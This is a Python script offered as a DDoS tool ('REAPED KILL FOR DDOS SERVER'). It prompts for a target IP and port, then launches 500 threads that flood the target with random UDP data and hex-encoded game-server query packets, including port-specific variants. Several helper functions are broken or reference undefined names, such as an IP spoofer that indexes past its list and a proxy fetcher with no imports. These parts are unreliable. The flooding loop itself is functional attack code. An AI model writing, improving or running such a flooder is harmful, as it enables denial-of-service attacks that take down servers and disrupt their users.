import socket, struct, codecs, sys, threading, random, time, os

Pacotes = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]

referers = [
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ,'
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ'
     'Your_Server_Bypassed_By_ZXZ'
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ'
     'Your_Server_Bypassed_By_ZXZ']

os.system("clear")
print ("\033[35m                      ╔══════════════════════════════════╗")
print ("\033[35m                      ║\033[31m  ╦═╗╔═╗╔═╗╔═╗╔═╗╔╦╗  ╦╔═╦╦  ╦  \033[35m   ║")
print ("\033[35m                      ║\033[31m  ╠╦╝║╣ ╠═╣╠═╝║╣  ║║  ╠╩╗║║  ║  \033[35m   ║")
print ("\033[35m                      ║\033[31m  ╩╚═╚═╝╩ ╩╩  ╚═╝═╩╝  ╩ ╩╩╩═╝╩═╝ \033[35m  ║")
print ("\033[35m                      ╚══════════════════════════════════╝")
print ("\033[35m                      ║\033[31m     REAPED KILL FOR DDOS SERVER     \033[35m   ║")
print ("\033[31m                  ╔════════════════════╦═════════════════════╗")                 
print ("\033[31m                  ║\033[32m   TOOLS BY Z𝕏Z    \033[31m ║ \033[32m  09/8/2022 \033[31m        ║")
print ("\033[31m                  ╚═══════════════════╦╩╦════════════════════╝")
ip = str(input("                          \033[32m  IP TARGET \033[31m║ ║\033[31m \033[37m"))           
port = int(input("                     \033[32m     PORT TARGET \033[31m║ ║\033[31m \033[37m"))           


def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    addr[4] = str(random.randrange(2, 256))
    addr[5] = str(random.randrange(2, 254))
    addr[6] = str(random.randrange(2, 256))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3] + d + addr[4] + d + addr[5] + d + addr[6]
    return assemebled

def getproxy():
    global proxies
    f = open(f'{nprox}.txt','wb')
    r = requests.get(urlproxy)
    f.write(r.content)
    f.close()
    proxies = open(f'{nprox}.txt').readlines()

class MyThread(threading.Thread):

    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1051)
            pack = random._urandom(666)
            msg = Pacotes[random.randrange(0, 5)]
            sock.sendto(bytes, (ip, int(port)))
            sock.sendto(pack, (ip, int(port)))
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))


if __name__ == '__main__':
    try:
        for x in range(500):
            mythread = MyThread()
            mythread.start()
            time.sleep(.1)

    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print ("╔════════════════════════════════════╗")
        print ("         ╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗╔╦╗        ")
        print ("         ╚═╗ ║ ║ ║╠═╝╠═╝║╣  ║║        ")
        print ("         ╚═╝ ╩ ╚═╝╩  ╩  ╚═╝═╩╝        ")
        print ("╚════════════════════════════════════╝")
        print ('\n\n')
        print ('STOP TO ATTACK {}').format(orgip)
